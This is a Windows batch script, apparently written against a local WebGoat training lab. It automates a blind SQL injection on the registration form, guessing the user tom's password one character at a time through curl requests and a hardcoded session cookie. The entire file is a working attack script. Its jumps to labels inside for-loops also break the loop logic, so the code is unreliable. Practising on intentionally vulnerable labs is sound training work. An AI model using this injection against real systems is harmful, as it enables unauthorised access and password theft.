@echo off
setlocal enabledelayedexpansion

REM SQL Injection Password Extractor - Batch Version

set "url=http://localhost:8001/WebGoat/SqlInjectionAdvanced/register"
set "webgoatSessionId=1A4A662E7F7EB355E185016813D8229B"

set "password="

echo ===============================================
echo Starting SQL Injection attack to extract password...
echo ===============================================
echo.

REM Loop through lengths 1 to 25
for /L %%l in (1,1,25) do (
    set "found=0"
    
    REM Loop through each character
    for %%c in (a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9) do (
        set "params=username_reg=tom'+AND+substring(password%%2C1%%2C%%l)%%3D'!password!%%c&email_reg=test%%40test.test&password_reg=test&confirm_password_reg=test"
        
        echo Trying: !password!%%c
        
        REM Make the request using curl
        curl.exe -s -X PUT "!url!" ^
            -H "Cookie: JSESSIONID=!webgoatSessionId!" ^
            -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" ^
            -H "Referer: http://localhost:8001/WebGoat/start.mvc" ^
            -H "Origin: http://localhost:8001" ^
            -H "Host: localhost:8001" ^
            -H "Accept: */*" ^
            -H "X-Requested-With: XMLHttpRequest" ^
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36" ^
            --data "!params!" > "%TEMP%\response.txt" 2>&1
        
        REM Show first line of response for debugging
        for /f "delims=" %%r in ('%SystemRoot%\System32\more.com ^< "%TEMP%\response.txt"') do (
            echo Response: %%r
            goto :checkResponse
        )
        
        :checkResponse
        REM Check if response contains "already exists"
        findstr /C:"already exists" "%TEMP%\response.txt" >nul 2>&1
        if !errorlevel! equ 0 (
            set "password=!password!%%c"
            echo FOUND: !password!
            set "found=1"
            goto :nextLength
        )
    )
    
    :nextLength
    if !found! equ 0 goto :done
)

:done
echo.
echo.
echo ===============================================
echo Password found: !password!
echo ===============================================

REM Cleanup
if exist "%TEMP%\response.txt" del "%TEMP%\response.txt"

endlocal
